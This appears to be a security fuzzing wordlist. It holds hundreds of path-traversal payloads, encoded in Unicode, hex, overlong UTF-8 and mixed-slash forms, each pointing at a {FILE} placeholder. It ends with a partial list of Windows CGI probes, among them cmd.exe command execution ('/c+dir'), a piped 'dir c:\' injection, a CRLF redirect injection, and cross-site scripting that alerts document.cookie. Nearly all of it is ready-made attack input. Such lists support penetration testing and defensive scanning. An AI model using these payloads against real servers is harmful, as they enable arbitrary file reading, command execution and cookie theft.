    %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
    %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
    %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
    %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
    %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
    %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
    %uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}
    ..%u2216{FILE}
    ..%u2216..%u2216{FILE}
    ..%u2216..%u2216..%u2216{FILE}
    ..%u2216..%u2216..%u2216..%u2216{FILE}
    ..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
    ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
    ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
    ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
    ..%uEFC8{FILE}
    ..%uEFC8..%uEFC8{FILE}
    ..%uEFC8..%uEFC8..%uEFC8{FILE}
    ..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
    ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
    ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
    ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
    ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
    ..%uF025{FILE}
    ..%uF025..%uF025{FILE}
    ..%uF025..%uF025..%uF025{FILE}
    ..%uF025..%uF025..%uF025..%uF025{FILE}
    ..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
    ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
    ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
    ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
    %uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}
    %uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}
    ..0x2f{FILE}
    ..0x2f..0x2f{FILE}
    ..0x2f..0x2f..0x2f{FILE}
    ..0x2f..0x2f..0x2f..0x2f{FILE}
    ..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
    ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
    ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
    ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
    0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
    0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
    ..0x5c{FILE}
    ..0x5c..0x5c{FILE}
    ..0x5c..0x5c..0x5c{FILE}
    ..0x5c..0x5c..0x5c..0x5c{FILE}
    ..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
    ..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
    ..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
    ..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
    0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
    0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
    ..%c0%2f{FILE}
    ..%c0%2f..%c0%2f{FILE}
    ..%c0%2f..%c0%2f..%c0%2f{FILE}
    ..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
    ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
    ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
    ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
    ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
    %c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
    %c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
    ..%c0%5c{FILE}
    ..%c0%5c..%c0%5c{FILE}
    ..%c0%5c..%c0%5c..%c0%5c{FILE}
    ..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
    ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
    ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
    ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
    ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
    %c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
    %c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
    ///%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    \\\%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    ..//{FILE}
    ..//..//{FILE}
    ..//..//..//{FILE}
    ..//..//..//..//{FILE}
    ..//..//..//..//..//{FILE}
    ..//..//..//..//..//..//{FILE}
    ..//..//..//..//..//..//..//{FILE}
    ..//..//..//..//..//..//..//..//{FILE}
    ..///{FILE}
    ..///..///{FILE}
    ..///..///..///{FILE}
    ..///..///..///..///{FILE}
    ..///..///..///..///..///{FILE}
    ..///..///..///..///..///..///{FILE}
    ..///..///..///..///..///..///..///{FILE}
    ..///..///..///..///..///..///..///..///{FILE}
    ..\\{FILE}
    ..\\..\\{FILE}
    ..\\..\\..\\{FILE}
    ..\\..\\..\\..\\{FILE}
    ..\\..\\..\\..\\..\\{FILE}
    ..\\..\\..\\..\\..\\..\\{FILE}
    ..\\..\\..\\..\\..\\..\\..\\{FILE}
    ..\\..\\..\\..\\..\\..\\..\\..\\{FILE}
    ..\\\{FILE}
    ..\\\..\\\{FILE}
    ..\\\..\\\..\\\{FILE}
    ..\\\..\\\..\\\..\\\{FILE}
    ..\\\..\\\..\\\..\\\..\\\{FILE}
    ..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
    ..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
    ..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
    ./\/./{FILE}
    ./\/././\/./{FILE}
    ./\/././\/././\/./{FILE}
    ./\/././\/././\/././\/./{FILE}
    ./\/././\/././\/././\/././\/./{FILE}
    ./\/././\/././\/././\/././\/././\/./{FILE}
    ./\/././\/././\/././\/././\/././\/././\/./{FILE}
    ./\/././\/././\/././\/././\/././\/././\/././\/./{FILE}
    .\/\.\{FILE}
    .\/\.\.\/\.\{FILE}
    .\/\.\.\/\.\.\/\.\{FILE}
    .\/\.\.\/\.\.\/\.\.\/\.\{FILE}
    .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
    .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
    .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
    .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../{FILE}
    ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\{FILE}
    .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\{FILE}
    ./../{FILE}
    ./.././../{FILE}
    ./.././.././../{FILE}
    ./.././.././.././../{FILE}
    ./.././.././.././.././../{FILE}
    ./.././.././.././.././.././../{FILE}
    ./.././.././.././.././.././.././../{FILE}
    ./.././.././.././.././.././.././.././../{FILE}
    .\..\{FILE}
    .\..\.\..\{FILE}
    .\..\.\..\.\..\{FILE}
    .\..\.\..\.\..\.\..\{FILE}
    .\..\.\..\.\..\.\..\.\..\{FILE}
    .\..\.\..\.\..\.\..\.\..\.\..\{FILE}
    .\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
    .\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
    .//..//{FILE}
    .//..//.//..//{FILE}
    .//..//.//..//.//..//{FILE}
    .//..//.//..//.//..//.//..//{FILE}
    .//..//.//..//.//..//.//..//.//..//{FILE}
    .//..//.//..//.//..//.//..//.//..//.//..//{FILE}
    .//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
    .//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
    .\\..\\{FILE}
    .\\..\\.\\..\\{FILE}
    .\\..\\.\\..\\.\\..\\{FILE}
    .\\..\\.\\..\\.\\..\\.\\..\\{FILE}
    .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
    .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
    .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
    .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
    ../{FILE}
    ../..//{FILE}
    ../..//../{FILE}
    ../..//../..//{FILE}
    ../..//../..//../{FILE}
    ../..//../..//../..//{FILE}
    ../..//../..//../..//../{FILE}
    ../..//../..//../..//../..//{FILE}
    ..\{FILE}
    ..\..\\{FILE}
    ..\..\\..\{FILE}
    ..\..\\..\..\\{FILE}
    ..\..\\..\..\\..\{FILE}
    ..\..\\..\..\\..\..\\{FILE}
    ..\..\\..\..\\..\..\\..\{FILE}
    ..\..\\..\..\\..\..\\..\..\\{FILE}
    ..///{FILE}
    ../..///{FILE}
    ../..//..///{FILE}
    ../..//../..///{FILE}
    ../..//../..//..///{FILE}
    ../..//../..//../..///{FILE}
    ../..//../..//../..//..///{FILE}
    ../..//../..//../..//../..///{FILE}
    ..\\\{FILE}
    ..\..\\\{FILE}
    ..\..\\..\\\{FILE}
    ..\..\\..\..\\\{FILE}
    ..\..\\..\..\\..\\\{FILE}
    ..\..\\..\..\\..\..\\\{FILE}
    ..\..\\..\..\\..\..\\..\\\{FILE}
    ..\..\\..\..\\..\..\\..\..\\\{FILE}

### Common Windows CGI (Update: 17 March 2010 - Total Statements: 76)

    # Common Windows CGI   (Update: 17 March 2010)
    # fuzz inside executable directories
    # on windows, this is usually /scripts or /cgi-bin
    # adam.muntner@quietmove.com

    cart32.exe
    get32.exe
    visadmin.exe
    foxweb.exe
    webplus.exe?about
    fpsrvadm.exe
    MsmMask.exe
    cmd.exe?/c+dir
    cmd1.exe?/c+dir
    post32.exe
    |dir%20c:\\
    cgitest.exe
    hpnst.exe?c=p+i=
    Pbcgi.exe
    testcgi.exe
    webfind.exe?keywords=01234567890123456789
    redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3C
    test-cgi.exe?<script>alert(document.cookie)</script>
    athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['
    mkilog.exe
